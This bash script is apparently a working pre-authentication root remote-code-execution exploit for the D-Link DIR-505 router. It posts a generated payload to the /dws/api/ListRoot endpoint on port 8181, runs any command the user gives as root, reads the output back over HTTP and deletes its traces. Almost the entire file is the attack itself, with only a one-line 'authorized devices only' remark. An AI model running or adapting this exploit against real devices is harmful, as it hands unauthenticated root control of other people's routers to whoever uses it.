#!/bin/bash
# DIR-505 webfile_cgi.cgi pre-auth RCE — run ONE command as root and fetch its output
# Usage: ./run_cmd.sh <host> [port] "<command>"
#   e.g. ./run_cmd.sh 192.168.0.1 8181 "ls -la /"
#
# How it works: the RCE executes  "<command> > /www/webfile_access/cmdout_<pid>.txt 2>&1",
# then the output is retrieved over the same 8181 HTTP service and the file is removed.
# Constraints: the command must not contain raw & = % (parser limitation); use %26 %3D %25.
# Notes: for authorized devices only; opens no extra port, writes only to RAM-backed paths,
# and cleans up after itself.
set -e
HOST="${1:?usage: $0 <host> [port] \"<command>\"}"
PORT="${2:-8181}"
CMD="${3:?usage: $0 <host> [port] \"<command>\"}"
HERE="$(cd "$(dirname "$0")" && pwd)"
OUT="/www/webfile_access/cmdout_$$.txt"
NAME="$(basename "$OUT")"
TMPPOC="/tmp/run_cmd_$$.bin"

case "$CMD" in
  *[\&=%]*) echo "[!] command contains raw '&', '=' or '%' (parser limitation)."; \
            echo "[!] encode them as %26 / %3D / %25 and retry."; exit 1;;
esac

send() {
  python3 "$HERE/gen_poc.py" --out "$TMPPOC" "$1" >/dev/null
  curl -s -m 15 -o /dev/null -w "    HTTP %{http_code}\n" \
    -X POST "http://$HOST:$PORT/dws/api/ListRoot" \
    -H 'Content-Type: application/x-www-form-urlencoded' --data-binary "@$TMPPOC"
}

echo "[*] target : $HOST:$PORT"
echo "[*] command: $CMD"
echo "[*] run (as root) ..."
send "$CMD > $OUT 2>%261; kill -9 \$PPID"
sleep 1
echo "----- output -----"
curl -s -m 10 "http://$HOST:$PORT/$NAME" || true
echo "------------------"
send "rm -f $OUT; kill -9 \$PPID" >/dev/null 2>&1 || true
rm -f "$TMPPOC"
echo "[*] cleaned up."
